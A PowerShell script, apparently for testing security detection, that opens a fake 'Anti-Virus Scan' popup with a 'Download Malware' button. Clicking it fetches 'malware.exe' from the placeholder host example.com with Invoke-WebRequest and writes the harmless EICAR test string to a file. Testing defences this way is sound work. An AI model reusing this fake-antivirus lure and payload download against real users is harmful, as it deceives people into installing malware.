# Load Windows Forms
Add-Type -AssemblyName System.Windows.Forms

# Create Fake Antivirus Popup
$form = New-Object System.Windows.Forms.Form
$form.Text = 'Anti-Virus Scan'
$form.Size = New-Object System.Drawing.Size(400,200)
$form.StartPosition = 'CenterScreen'

# Add Label
$label = New-Object System.Windows.Forms.Label
$label.Location = New-Object System.Drawing.Point(10,20)
$label.Size = New-Object System.Drawing.Size(380,40)
$label.Text = 'Your PC has been scanned and no viruses were found.'
$form.Controls.Add($label)

# Define the log file path for EICAR creation
$logFile = "C:\ProgramData\entropygorilla.log"
$scriptName = "eicar.ps1"

# Function to log messages
function Log-Message {
    param (
        [string]$message,
        [string]$level = "INFO"
    )
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $logEntry = "$timestamp [$level] [$scriptName] $message"
    Add-Content -Path $logFile -Value $logEntry
}

# EICAR Test String
$eicarTestString1 = 'X5O!P%@AP[4\PZX54(P^)7CC)7}$'
$eicarTestString2 = '-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*'

# Define the file path where EICAR file will be created
$eicarFilePath = "C:\ProgramData\EICAR.txt"

# Function to create EICAR test file
function Create-FakeEicarFile {
    Log-Message "Starting creation of EICAR test file."
    try {
        # Check if the file already exists, and if it does, delete it first
        if (Test-Path -Path $eicarFilePath) {
            Remove-Item -Path $eicarFilePath -Force
            Log-Message "Existing EICAR file found and deleted."
        }

        # Create the EICAR test file
        "$($eicarTestString1)EICAR$($eicarTestString2)" | Out-File -FilePath $eicarFilePath -Force
        Log-Message "EICAR test file created at $eicarFilePath."

    } catch {
        $errorMessage = "An error occurred while creating the EICAR file: $_"
        Write-Host $errorMessage
        Log-Message $errorMessage "ERROR"
    }

    # End logging for EICAR creation
    Log-Message "EICAR test file creation completed."
}

# Add Button to Trigger Malware Download
$button = New-Object System.Windows.Forms.Button
$button.Location = New-Object System.Drawing.Point(150,100)
$button.Size = New-Object System.Drawing.Size(120,30)
$button.Text = 'Download Malware'

$button.Add_Click({
    # Log button click event
    Log-Message "Button clicked: Attempting to download malware."

    # Download malware (second payload)
    try {
        Invoke-WebRequest -Uri 'https://example.com/malware.exe' -OutFile 'C:\temp\malware.exe'
        Log-Message "Malware downloaded to C:\temp\malware.exe."
    } catch {
        Log-Message "Failed to download malware: $_" "ERROR"
    }

    # Create EICAR test file (first payload)
    Create-FakeEicarFile
})

$form.Controls.Add($button)

# Show Fake Antivirus Pop-up
Log-Message "Displaying simulated fake antivirus pop-up."
$form.ShowDialog()
